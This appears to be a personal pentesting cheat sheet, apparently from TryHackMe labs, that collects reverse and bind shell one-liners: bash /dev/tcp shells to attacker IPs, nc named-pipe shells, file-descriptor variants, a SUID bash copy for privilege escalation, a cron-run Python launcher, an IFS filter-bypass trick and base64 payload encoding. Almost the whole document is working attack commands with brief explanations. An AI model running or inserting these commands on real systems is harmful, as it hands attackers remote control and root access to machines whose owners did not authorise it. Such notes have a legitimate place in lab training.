
```sh
#!/bin/bash

bash -i >& /dev/tcp/10.21.31.111/443 0>&1
```

<font color="red">Don't forget to make sure your script file is executable `chmod +x [script]`
cron won't run without both #! and +x</font>
Also testrun shell as current user before waiting for scheduled job to run

---

If you get the error:
`mksudo.sh: 8: mksudo.sh: Syntax error: Bad fd number`
you're running with sh, not bash

---

`${IFS%??}` = space as in `which${IFS%??}bash`

^works on bash, not on zsh

Reverse shell:
`/bin/bash -i >& /dev/tcp/10.18.21.236/443 0>&1`

-i   interactive
`>&`: redirects both standard output (stdout) and standard error (stderr)
`0>&1`: redirects the standard input (stdin) to the same destination as standard output. This ensures that any input intended for the shell is also sent over the network connection to the attacker's machine.

-l   executes `~/.bash_profile`, `~/.bash_login`, or `~/.profile` (in that order) and inherits environment variables set in those files

rev shell file:
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.18.21.236/443 0>&1
```

To run with existing cronjob or similar:
```sh
#!/bin/bash
cp /bin/bash /tmp/mybash
chmod +xs /tmp/mybash
```
chmod +x /home/user/whatever.sh
/tmp/mybash -p

---
alternative

nano revsh.sh
```sh
#!/bin/bash
bash -i >& /dev/tcp/10.18.21.236/443 0>&1
```
in python code run by system (like crontab)
```python
import os

os.system("touch /tmp/testfile")
os.system("bash /tmp/revsh.sh")
```

---

Revsh using named pipes (connecting from target machine)
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

Bind shell using named pipes (listening on target machine)
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
connect with
```sh
nc -nv TARGET_IP 8080
```

---

Read Line Rev shell (creates file descriptor)
```sh
5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```

Rev shell with File descriptor 196
```sh
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```

Rev shell with File descriptor 5
```sh
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```

---

### base 64 encoding it

```sh
echo -n /bin/bash -c 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1' | base64 -w0
```